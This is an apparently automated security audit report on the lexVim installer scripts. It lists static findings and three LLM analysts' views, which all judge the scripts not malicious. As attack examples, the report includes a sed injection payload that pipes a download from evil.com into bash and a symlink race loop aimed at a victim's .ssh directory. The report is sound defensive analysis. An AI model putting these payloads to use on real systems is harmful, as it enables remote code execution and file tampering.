# Security Audit Report: lexkong/lexVim

| Field | Value |
|-------|-------|
| Repository | [lexkong/lexVim](https://github.com/lexkong/lexVim) |
| Commit | `0b3afe3eb60b` |
| Commit Date | 2018-05-31T10:53:53+08:00 |
| Audit Agent | V1 |
| Audit Date | 2026-03-25T08:38:15.017467+00:00 |
| Overall Risk | **HIGH** |
| Confidence | 73% |
| Files Scanned | 3 / 13 |

## Scan Summary

| Metric | Value |
|--------|-------|
| Total files in repo | 13 |
| Files analyzed | 3 |
| Skipped (unsupported type) | 9 |
| Skipped (too large) | 1 |
| Analyzed by language | shell: 2, skill_prompt: 1 |
| Dominant language | Markdown (✅ supported) |
| Code coverage | 3/2 code files (100%) |
| Top file types | .md(4), .jpg(3), (no ext)(2), .sh(2), .gz(2) |

## Severity Summary

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 0 |
| 🟠 HIGH | 1 |
| 🟡 MEDIUM | 4 |
| 🔵 LOW | 1 |
| ⚪ INFO | 0 |
| 🟢 SAFE | 1 |

## Detailed Findings

### 🟠 Finding #1: Shell: shell_profile_modify

- **File**: `start_vim.sh`
- **Line**: 33
- **Severity**: HIGH
- **Source**: static
- **Description**: Modifies shell profile — code runs on every login [×4 occurrences at lines: 33, 36, 37, 70]

```
--- Line 33 ---
      28 |     chmod 755 "$1/ctags"
      29 | }
      30 | 
      31 | function addBash()
      32 | {
>>>   33 |     CK_VIM=`grep "vi='vim'" ~/.bashrc | wc -l`
      34 |     if [ "w${CK_VIM}" = "w0" ]
      35 |     then
      36 |         echo " " >> ~/.bashrc
      37 |         echo "alias vi='vim'" >> ~/.bashrc
      38 |     fi

--- Line 36 ---
      31 | function addBash()
      32 | {
      33 |     CK_VIM=`grep "vi='vim'" ~/.bashrc | wc -l`
      34 |     if [ "w${CK_VIM}" = "w0" ]
      35 |     then
>>>   36 |         echo " " >> ~/.bashrc
      37 |         echo "alias vi='vim'" >> ~/.bashrc
      38 |     fi
      39 | }
      40 | 
      41 | # install_bin $install_dir

--- Line 37 ---
      32 | {
      33 |     CK_VIM=`grep "vi='vim'" ~/.bashrc | wc -l`
      34 |     if [ "w${CK_VIM}" = "w0" ]
      35 |     then
      36 |         echo " " >> ~/.bashrc
>>>   37 |         echo "alias vi='vim'" >> ~/.bashrc
      38 |     fi
      39 | }
      40 | 
      41 | # install_bin $install_dir
      42 | function install_bin()

--- Line 70 ---
      65 |     prompt
      66 |     install_ctags $ctagBin
      67 |     addBash
      68 |     install_bin $installBin
      69 | 
>>>   70 |     . ~/.bashrc
      71 |     echo "this vim config is success !"
      72 |     exit 0
      73 | }
      74 | 
      75 | clear
```

### 🟡 Finding #2: Shell: chmod_executable

- **File**: `start_vim.sh`
- **Line**: 28
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Makes files executable — check what file is being modified

```
      23 | # install_ctags $install_dir
      24 | function install_ctags()
      25 | {
      26 |     mkdir -p "$1"
      27 |     tar -zxf ctags.tar.gz -C "$1"
>>>   28 |     chmod 755 "$1/ctags"
      29 | }
      30 | 
      31 | function addBash()
      32 | {
      33 |     CK_VIM=`grep "vi='vim'" ~/.bashrc | wc -l`
```

### 🟡 Finding #3: Shell: rm_recursive

- **File**: `update_vim.sh`
- **Line**: 7
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Recursive file deletion [×3 occurrences at lines: 7, 40, 56]

```
--- Line 7 ---
       2 | dir="/tmp/lexVim"
       3 | vim_package="vim1.0.7.tar.gz"
       4 | 
       5 | 
       6 | # do some prepare job
>>>    7 | [ -d $dir ] && rm -rf $dir
       8 | mkdir $dir
       9 | 
      10 | tar -xvzf packages/${vim_package} -C $dir/ &>/dev/null
      11 | 
      12 | if [ $? -ne 0 ];then

--- Line 40 ---
      35 |    if [ $? -ne 0 ];then
      36 |        echo unzip vim-go-master.zip failed
      37 |        exit 1
      38 |    fi
      39 | 
>>>   40 |    [ -d vim-go ] && rm -rf vim-go
      41 |    mv vim-go-master vim-go
      42 |    flag=1
      43 | }
      44 | 
      45 | cd $basepath

--- Line 56 ---
      51 |     if [ $? -ne 0 ];then
      52 |         echo unzip Vundle.vim-master.zip failed
      53 |         exit 1
      54 |     fi
      55 | 
>>>   56 |     [ -d Vundle.vim ] && rm -rf Vundle.vim
      57 |     mv Vundle.vim-master Vundle.vim
      58 |     flag=1
      59 | }
      60 | 
      61 | #if [ $flag -eq 1 ];then
```

### 🔵 Finding #4: Shell: system_info

- **File**: `start_vim.sh`
- **Line**: 57
- **Severity**: LOW
- **Source**: static
- **Description**: Collects system information

```
      52 | 
      53 | #deine Vim_config
      54 | function Vim_config ()
      55 | {
      56 |     clear
>>>   57 |     if [ `id -u` -eq 0 ];then
      58 |         ctagBin="/usr/bin"
      59 |         installBin="$HOME/bin"
      60 |     else
      61 |         ctagBin="$HOME/bin"
      62 |         installBin="$HOME/bin"
```

## LLM Cross-Validation Results

### Analysis Group #1

- **Final Severity**: MEDIUM
- **Confidence**: 71%
- **Is Malicious**: False
- **Is Gray Area**: True

#### Gray Area Analysis

## Gray Area Analysis

### Why this might be legitimate:
- This script is the documented installer for a Vim IDE configuration (lexVim). It is explicitly described in the README as the setup script to run after cloning the repository. Modifying ~/.bashrc to add a vi alias is standard practice for IDE/editor installers, and sourcing ~/.bashrc afterward is the normal way to apply those changes in the current shell session.
- This pattern is safe only when treated as a trusted local installer run in a controlled environment. Correct usage includes: (1) run only from a verified repository checkout (ideally pinned commit, checksum/signature-verified tarballs); (2) do not run as root unless strictly necessary, and prefer user-local install paths; (3) backup `~/.vimrc` and `~/.bashrc` before modification; (4) make profile edits idempotent and precise (e.g., `grep -qxF "alias vi='vim'" ~/.bashrc || printf "\nalias vi='vim'\n" >> ~/.bashrc`); (5) avoid sourcing full `~/.bashrc` in-script—instead print instructions to re-login or source manually; (6) quote all variable expansions and avoid `for f in $(ls ...)` to handle spaces safely. In short, this is a normal bootstrap pattern for dotfiles, but only safe with trust, backups, and constrained execution.
- This is a standard, albeit slightly naive, installation script for a custom Vim environment (lexVim). It legitimately needs to extract configuration files, install dependencies like `ctags`, and set up aliases in the user's shell profile to function correctly.

### Why this might be dangerous:
- N/A — the only theoretical concern is that a malicious actor could replace the vim packages (ctags.tar.gz, vim-go-ide-bin/) with malicious binaries before distribution, but this is a supply-chain concern about the repository contents, not a vulnerability in the script logic itself. The script itself performs no malicious actions.
- This becomes dangerous under several conditions: (1) If repository contents are tampered (e.g., malicious `ctags.tar.gz`, altered binary payloads in `vim-go-ide-bin`, or modified script), the installer copies/extracts attacker code into executable paths and enables it. (2) Appending to `~/.bashrc` plus immediate `. ~/.bashrc` means any malicious pre-existing or newly injected shell commands execute right away, turning profile modification into code execution. (3) Running as root increases impact: writing binaries into privileged locations (`/usr/bin`) can create persistence or path hijacking opportunities. (4) Weak matching logic (`grep "vi='vim'"`) can be bypassed or duplicate entries can accumulate; profile pollution can degrade shell behavior. (5) Unquoted/glob-heavy operations (`tar -zxf ${VIM_FILE}`, loop over `$(ls ...)`) are brittle and can mis-handle filenames, potentially leading to unintended file operations. So the dangerous condition is primarily "untrusted source + auto-install + profile sourcing + elevated privileges."
- 1. **Sed Command Injection**: The script uses `sed -i "s/Bill/$AUTHOR/g" $VIMRC`. An attacker socially engineers a victim to run the script and paste a payload like `malicious/g; s/^/curl -s http:\/\/evil.com\/payload | bash/e; s/Bill` when prompted for their name. GNU `sed` will evaluate the `e` flag, executing the downloaded payload as the user (or root, if run with `sudo`).
2. **Supply Chain / Trojan**: An attacker forks the repo, replaces `ctags.tar.gz` with a malicious binary, and promotes the 'improved' Vim IDE. When developers run the installer with `sudo`, the malware is placed in `/usr/bin/ctags` and executed whenever Vim is used.

### Recommendations:
- [security_analyst] No action required. The static analysis findings are false positives in this context. Shell profile modification is expected and documented behavior for an IDE installer. Users should, as always, review the contents of the extracted packages (ctags.tar.gz, vim-go-ide-bin/) before running any installer from an untrusted source.
- [intent_analyst] Keep the functionality but harden it: verify package integrity (SHA256/signature), remove automatic `source ~/.bashrc`, and replace with explicit user prompt; add `set -euo pipefail`; quote all expansions; replace `for f in $(ls ...)` with `for f in ../vim-go-ide-bin/*; do cp -f -- "$f" "$1/"; done`; detect and backup existing dotfiles before editing; perform idempotent profile edits with exact-line checks; install binaries to user-local `~/.local/bin` by default; require explicit `--system` flag for root/system-wide installs; and validate that extracted binaries are expected type/permissions. These changes preserve legitimate installer behavior while reducing code-execution and persistence risks.
- [adversarial_analyst] 1. Avoid using `sed` with unsanitized user input. Escape special characters (like `/`, `&`, and `;`) in the user input before passing it to `sed`, or use safer configuration parsing tools.
2. Do not require `sudo` for user-specific IDE configurations. Install binaries to `~/.local/bin` instead of `/usr/bin` to adhere to the principle of least privilege.
3. Provide checksums (e.g., SHA256) for all binary blobs (`ctags.tar.gz`) and verify them before extraction to prevent tampering.

**security_analyst** (anthropic/claude-sonnet-4.6):
> This is a legitimate Vim IDE installation script that sets up a Vim configuration environment. The shell profile modifications (writing to ~/.bashrc) are entirely expected and appropriate for an IDE installer — specifically, it adds an alias 'vi=vim' to ensure the user's 'vi' command invokes 'vim'. The script also extracts vim configuration packages, installs ctags, copies Go IDE binaries, and sources ~/.bashrc to apply changes immediately. All operations are scoped to the user's home directory or system bin directories, with no data exfiltration, no obfuscation, no hardcoded external URLs, and no access to unrelated sensitive resources like SSH keys or credentials.

**intent_analyst** (openai/gpt-5.3-codex):
> This script is trying to perform a one-shot Vim IDE setup: unpack Vim config files into the user’s home directory, personalize `.vimrc` with user-provided name/email, install a bundled `ctags` binary and helper binaries, add `alias vi='vim'` to `~/.bashrc`, and then immediately load that shell profile. The intent is administrative convenience/automation, not covert behavior, but it uses risky shell-profile and file-install patterns that can have security side effects.

**adversarial_analyst** (google/gemini-3.1-pro-preview):
> From an attacker's perspective, this installation script is an excellent vehicle for a Trojan and contains a local command injection flaw. It requests `sudo` privileges, modifies shell profiles (`~/.bashrc`), and drops opaque binaries (`ctags.tar.gz`, `vim-go-ide-bin`) into system or user paths. A malicious actor could easily fork this repository, backdoor the binaries, and distribute it to developers. Furthermore, the script contains a command injection vulnerability via `sed` in the `prompt()` function. If an attacker can trick a user into pasting a crafted string into the Name or Email prompts, they can achieve arbitrary code execution (potentially as root) during the installation process.

#### Disagreements Between Models

- **security_analyst**: LOW - This is a legitimate Vim IDE installation script that sets up a Vim configuration environment. The shell profile modifications (writing to ~/.bashrc) are entirely expected and appropriate for an IDE i
- **intent_analyst**: HIGH - This script is trying to perform a one-shot Vim IDE setup: unpack Vim config files into the user’s home directory, personalize `.vimrc` with user-provided name/email, install a bundled `ctags` binary 
- **adversarial_analyst**: MEDIUM - From an attacker's perspective, this installation script is an excellent vehicle for a Trojan and contains a local command injection flaw. It requests `sudo` privileges, modifies shell profiles (`~/.b

### Analysis Group #2

- **Final Severity**: MEDIUM
- **Confidence**: 71%
- **Is Malicious**: False
- **Is Gray Area**: True

#### Gray Area Analysis

## Gray Area Analysis

### Why this might be legitimate:
- This script is used to update a Vim IDE configuration package by unpacking a tarball, updating plugin directories (vim-go, Vundle.vim) and .vimrc from a 'latest' folder, then repackaging everything into a distributable tarball. The rm -rf calls are necessary cleanup steps to remove old plugin directories before replacing them with updated versions.
- This pattern is legitimate in build/update scripts when you need idempotent replacement of generated artifacts or extracted directories. The safe way to use it is: (1) constrain all delete targets to known, absolute, script-owned paths, (2) quote all variable expansions (`"$dir"`), (3) validate target path before deletion (must be non-empty, not `/`, and under an expected prefix), (4) ensure working directory changes succeed before any relative-path deletes (`cd "$dir/.vim/bundle" || exit 1`), (5) prefer unique temp dirs via `mktemp -d` instead of fixed `/tmp/lexVim`, and (6) fail fast with `set -euo pipefail`. For replacement directories (e.g., `vim-go`, `Vundle.vim`), a safe pattern is to remove only after successful unzip and path verification, ideally using `rm -rf -- "$target"` where `$target` has been canonicalized and checked.
- This is a standard, albeit insecurely written, maintenance script used by the developer to update and package the Vim configuration and its plugins into a tarball for distribution. The `rm -rf` commands are simply used to clean up old build artifacts before extracting new ones.

### Why this might be dangerous:
- The only theoretical risk is if an attacker could control the contents of the `latest/` directory or the `packages/vim1.0.7.tar.gz` file, they could inject malicious files into the Vim configuration. However, this is a supply-chain concern about the input files, not a vulnerability in the script itself. The script does not introduce any unexpected behavior.
- This becomes dangerous when path assumptions break. Specific conditions: (a) unquoted variables or unexpected whitespace/globs cause path misinterpretation; (b) `cd` fails silently, then `rm -rf vim-go` or `rm -rf Vundle.vim` runs in the wrong directory; (c) fixed `/tmp/lexVim` is pre-created or manipulated by another user/process (race/symlink abuse on shared systems), causing writes/deletes in unintended places; (d) script is run with elevated privileges, amplifying impact; (e) package contents or zip extraction behavior are untrusted, enabling directory confusion before cleanup. Even if not attacker-controlled in normal use, these missing controls can turn maintenance code into accidental destructive behavior.
- 1. A local attacker runs a continuous loop attempting to create a symlink: `while true; do ln -s /home/victim/.ssh /tmp/lexVim 2>/dev/null; done`.
2. The victim (developer) runs `update_vim.sh`.
3. The script executes `rm -rf /tmp/lexVim`, removing any existing symlink.
4. In the split second before `mkdir /tmp/lexVim` runs, the attacker's loop successfully creates the symlink `/tmp/lexVim -> /home/victim/.ssh`.
5. `mkdir /tmp/lexVim` fails (file exists), but the script continues because there is no error handling.
6. `tar -xvzf packages/vim1.0.7.tar.gz -C /tmp/lexVim/` executes, following the symlink and extracting the archive's contents directly into the victim's `.ssh` directory, potentially overwriting files or filling it with unexpected data.

### Recommendations:
- [security_analyst] No action required for the script itself. As a minor hardening suggestion, quoting shell variables (e.g., `"$dir"` instead of `$dir`) would prevent word-splitting issues, and verifying checksums of the input packages before extraction would improve supply-chain integrity. These are best-practice improvements, not security vulnerabilities.
- [intent_analyst] Harden the script with explicit safety guards: add `set -euo pipefail`; replace `dir="/tmp/lexVim"` with `dir="$(mktemp -d /tmp/lexVim.XXXXXX)"`; quote every variable; validate delete targets before `rm -rf` (non-empty, not `/`, must match expected prefix); require successful `cd` (`cd "$basepath" || exit 1`); use `rm -rf -- "$path"`; and add trap cleanup (`trap 'rm -rf -- "$dir"' EXIT`) if temp dirs are used. Also avoid relative deletes where possible by using absolute, verified paths for `vim-go` and `Vundle.vim`.
- [adversarial_analyst] Avoid using hardcoded paths in globally writable directories like `/tmp`. Instead, use `mktemp -d` to create a secure, randomly named temporary directory (e.g., `dir=$(mktemp -d)`). Additionally, implement error checking after critical commands (like `mkdir` or `cd`) or use `set -e` at the beginning of the script to ensure it fails immediately if any command fails.

**security_analyst** (anthropic/claude-sonnet-4.6):
> This is a legitimate Vim IDE update/packaging script that extracts packages, moves plugin files, and repackages them. The recursive `rm -rf` operations are all scoped to well-defined, hardcoded paths: `/tmp/lexVim` (a temporary working directory), `vim-go` (a plugin directory within the bundle path), and `Vundle.vim` (another plugin directory). These deletions are standard cleanup steps before replacing directories with freshly unzipped versions. There is no obfuscation, no access to unrelated resources (e.g., SSH keys, credentials), no data exfiltration to external URLs, and no modification of system files outside the script's working directory. The behavior is entirely consistent with a Vim plugin management/packaging tool.

**intent_analyst** (openai/gpt-5.3-codex):
> This script is trying to rebuild and refresh a Vim distribution archive (vim1.0.7.tar.gz) by unpacking it into a temp directory, optionally replacing bundled components (.vimrc, vim-go, Vundle), then re-tarring and copying the result. The recursive deletions (`rm -rf`) appear to be operational cleanup/replacement steps, not destructive intent by themselves, but they are implemented in a way that is safety-fragile.

**adversarial_analyst** (google/gemini-3.1-pro-preview):
> The script uses a hardcoded, predictable temporary directory (`/tmp/lexVim`) in a globally writable location. This introduces a Time-of-Check to Time-of-Use (TOCTOU) race condition. An attacker with local access to the system could exploit this by creating a symlink at `/tmp/lexVim` pointing to a sensitive directory exactly between the `rm -rf` and `mkdir` commands. Because the script does not check if `mkdir` succeeds, subsequent commands like `tar` will follow the attacker's symlink and extract files into the targeted directory, potentially overwriting sensitive data or leading to privilege escalation.

#### Disagreements Between Models

- **security_analyst**: LOW - This is a legitimate Vim IDE update/packaging script that extracts packages, moves plugin files, and repackages them. The recursive `rm -rf` operations are all scoped to well-defined, hardcoded paths:
- **intent_analyst**: MEDIUM - This script is trying to rebuild and refresh a Vim distribution archive (vim1.0.7.tar.gz) by unpacking it into a temp directory, optionally replacing bundled components (.vimrc, vim-go, Vundle), then 
- **adversarial_analyst**: MEDIUM - The script uses a hardcoded, predictable temporary directory (`/tmp/lexVim`) in a globally writable location. This introduces a Time-of-Check to Time-of-Use (TOCTOU) race condition. An attacker with l

### Analysis Group #3

- **Final Severity**: SAFE
- **Confidence**: 78%
- **Is Malicious**: False
- **Is Gray Area**: True
- **Semantic Review Mode**: ✅ `skill_prompt` forced review (static findings = 0)

#### Gray Area Analysis

## Gray Area Analysis

### Why this might be legitimate:
- This is a documentation file (skill.md) that serves as a reference guide for Vim users, explaining how to convert between TAB and space indentation in Vim. It is part of a Vim IDE configuration project and is intended to be read by users who want to learn Vim tips and tricks.
- The safe pattern is to apply indentation conversion in a controlled, filetype-aware way. For Python and most modern codebases, use spaces (`expandtab`) with consistent width (`tabstop`, `shiftwidth`, `softtabstop` all aligned, e.g. 4). For existing files, run conversion only after confirming project conventions and ideally only on indentation, not embedded tabs in content. Preferred workflow: (1) inspect current whitespace (`:set list`), (2) set buffer-local options (`:setlocal tabstop=4 shiftwidth=4 softtabstop=4 expandtab`), (3) run `:retab` (without `!`) first, (4) review diff before saving, and (5) commit separately so whitespace-only changes are auditable. Use filetype exceptions (e.g., Makefiles require hard tabs) via autocmd/filetype plugins.
- This is standard documentation for a Vim configuration repository (lexVim), intended to teach users or AI agents how to manage whitespace formatting (tabs vs. spaces), which is particularly useful for languages like Python.

### Why this might be dangerous:
- This becomes dangerous when `%retab!` is applied broadly or blindly. The `!` variant can modify tabs beyond leading indentation, including tabs inside string literals, data files, alignment-sensitive content, generated files, or protocol fixtures. Specific risky conditions include: Makefiles (commands must begin with real tabs), mixed-language repositories with different style requirements, files where tab characters are semantically significant, and large batch edits without diff/review. Even without malicious intent, this can silently introduce runtime/build failures, formatting corruption, noisy diffs, and hard-to-trace regressions. In a hostile scenario, someone could intentionally run aggressive retab operations to create subtle breakage while appearing to perform harmless formatting cleanup.
- There is no realistic abuse scenario for this specific text. It is purely informational. An attacker cannot exploit this content unless the underlying Markdown parser or AI agent reading it has a completely unrelated, fundamental vulnerability (such as a buffer overflow in the renderer), which has nothing to do with the text itself.

### Recommendations:
- [security_analyst] No action required. This file is benign documentation and poses no security risk.
- [intent_analyst] Keep this pattern but add safeguards: use `setlocal` instead of global `set`; avoid `%retab!` unless absolutely necessary; prefer `:retab` first; create backups and review `git diff` before save/commit; define filetype-specific rules (especially `noexpandtab` for Makefiles); and document team whitespace policy in `.editorconfig` or project lint rules. If mass conversion is required, run it in a dedicated commit and validate builds/tests immediately after.
- [adversarial_analyst] No action needed. The file is completely safe and represents standard, benign documentation.

**security_analyst** (anthropic/claude-sonnet-4.6):
> This file is a straightforward Vim tips/tricks documentation file written in Markdown (Chinese language). It contains only documentation about how to convert between spaces and TAB characters in Vim using standard Vim commands (:set ts=4, :set expandtab, :%retab!). There are no prompt injection attempts, jailbreak backdoors, data exfiltration instructions, or any other security concerns. The content is purely educational documentation about Vim editor configuration.

**intent_analyst** (openai/gpt-5.3-codex):
> This document is instructional Vim usage guidance intended to normalize indentation by converting tabs and spaces (`set ts=4`, `set expandtab`/`set noexpandtab`, `%retab!`). The intent is legitimate editor configuration and cleanup of downloaded files with inconsistent indentation, not exploitation or unauthorized behavior.

**adversarial_analyst** (google/gemini-3.1-pro-preview):
> From an attacker's perspective, this file provides no exploitable surface. It is a standard Markdown documentation file explaining basic Vim commands for converting between tabs and spaces (e.g., `set expandtab`, `%retab!`). Evaluating this under the context of a 'skill_prompt' for an AI agent, there are no prompt injection vulnerabilities, jailbreak backdoors, or data exfiltration instructions present. It simply provides benign, factual instructions on how to format text within the Vim editor.

#### Disagreements Between Models

- **security_analyst**: SAFE - This file is a straightforward Vim tips/tricks documentation file written in Markdown (Chinese language). It contains only documentation about how to convert between spaces and TAB characters in Vim u
- **intent_analyst**: LOW - This document is instructional Vim usage guidance intended to normalize indentation by converting tabs and spaces (`set ts=4`, `set expandtab`/`set noexpandtab`, `%retab!`). The intent is legitimate e
- **adversarial_analyst**: SAFE - From an attacker's perspective, this file provides no exploitable surface. It is a standard Markdown documentation file explaining basic Vim commands for converting between tabs and spaces (e.g., `set

---
*Generated by Skill Audit Agent V1 on 2026-03-25T08:38:15.017467+00:00*